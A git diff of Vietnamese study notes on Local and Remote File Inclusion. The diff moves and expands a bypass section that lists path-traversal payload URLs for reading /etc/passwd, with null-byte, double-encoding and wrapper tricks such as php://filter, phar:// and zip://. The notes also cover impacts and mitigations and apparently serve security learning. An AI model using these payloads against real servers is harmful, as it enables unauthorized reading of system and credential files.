@@ -12,16 +12,6 @@ Nguyên nhân chính là do máy chủ không kiểm tra và xác thực đầu 
 ### Tác hại
   - Kẻ tấn công sẽ truy cập và đọc được thông tin nhạy cảm như `/etc/passwd`, các cấu hình, các file nhạy cảm... hoặc có thể thực thi các file khác.
   - Dẫn đến các cuộc tấn công khác nhứ XSS, DOS, Command Injection,..
-### Bypass
-Khi tham số được người dùng kiểm soát để đưa vào xử lý, server có thể thêm 1 số filter để ứng dụng hoạt động theo ý muốn. Vì vậy cách bypass tùy theo từng trường hợp:
-- Server thêm extension `.php` phía sau như `include($_GET["page"].".php");`. Khi đó nên sử dụng `null` byte như `%00` hoặc `0x00` dưới dạng hex. Ví dụ: `http://example.com/index.php?page=../../../etc/passwd%00`. Tuy nhiên `null byte` không được sử dụng ở version PHP mới. Thay vào đó có thể sử dụng `./`, nó chỉ thư mục hiện tại : `/etc/passwd/.` 
-- Khi server filter 1 số ký tự thì có thể bypass bằng cách `Encoding` cũng như `Double Encoding`. Ví dụ: `http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd` hoặc có thể thay thế `/` bằng `\`
-- Khi server có thể kiểm tra thư mục hiện tại và chỉ cho phép truy cập khi ở thư mục đó thì ta thêm thư mục đó phía trước payload ví dụ: `http://example.com/index.php?lang=languages/../../../../../etc/passwd`
-- Xem cách server xử lý và sử dụng payload thích hợp. Ví dụ:
-`http://example.com/index.php?page=....//....//etc/passwd` <br>
-`http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd`
-...
-
 # RFI (Remote Fle Iclusion)
 ### Khái niệm 
 Đây là kỹ thuật mà kẻ tấn công có thể include 1 file hoặc chèn file mã độc từ một máy chủ khác vào trong trang web bằng cách sử dụng đường dẫn tuyệt đối đến các tệp tin từ xa. RFI thường được sử dụng như một phương pháp tấn công phụ để thực hiện các cuộc tấn công khác.
@@ -38,6 +28,21 @@ Tác của RFI cao hơn LFI vì các lỗ hổng RFI cho phép kẻ tấn công 
 - Giới hạn quyền truy cập vào hệ thống.
 - Tắt các options `allow_url_fopen`, `allow_url_include` trong cấu hình server
 - Cập nhật ứng dụng, sử dụng tường lửa...
-### Bypass
-- Sử dụng các protocols và wrappers: `phar://`, `php://`, `http://`, `ftp://`...
-- 
+### Bypass LFI,RFI
+Khi tham số được người dùng kiểm soát để đưa vào xử lý, server có thể thêm 1 số filter để ứng dụng hoạt động theo ý muốn. Vì vậy cách bypass tùy theo từng trường hợp:
+- Server thêm extension `.php` phía sau như `include($_GET["page"].".php");`. Khi đó nên sử dụng `null` byte như `%00` hoặc `0x00` dưới dạng hex. Ví dụ: `http://example.com/index.php?page=../../../etc/passwd%00`. Tuy nhiên `null byte` không được sử dụng ở version PHP mới. Thay vào đó có thể sử dụng `./`, nó chỉ thư mục hiện tại : `/etc/passwd/.` 
+- Khi server filter 1 số ký tự thì có thể bypass bằng cách `Encoding` cũng như `Double Encoding`. Ví dụ: `http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd` hoặc có thể thay thế `/` bằng `\`
+- Khi server có thể kiểm tra thư mục hiện tại và chỉ cho phép truy cập khi ở thư mục đó thì ta thêm thư mục đó phía trước payload ví dụ: `http://example.com/index.php?lang=languages/../../../../../etc/passwd`
+- Xem cách server xử lý và sử dụng payload thích hợp. Ví dụ:
+`http://example.com/index.php?page=....//....//etc/passwd` <br>
+`http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd`
+- Sử dụng các protocols và wrappers: 
+  - php://filter<br>String filters : string.rot13, string.toupper, string.tolower, string.strip_tags
+  <br>Conversion Filters: convert.base64-encode, convert.base64-decode, convert.quoted-printable-encode, convert.quoted-printable-decode
+  - php://
+  - zip:// và rar://
+  - phar:// 
+  - ...
+<br>Xem thêm <a href="https://book.hacktricks.xyz/pentesting-web/file-inclusion" >Hacktricks</a>
+
+## So sánh LFI và Path traversal
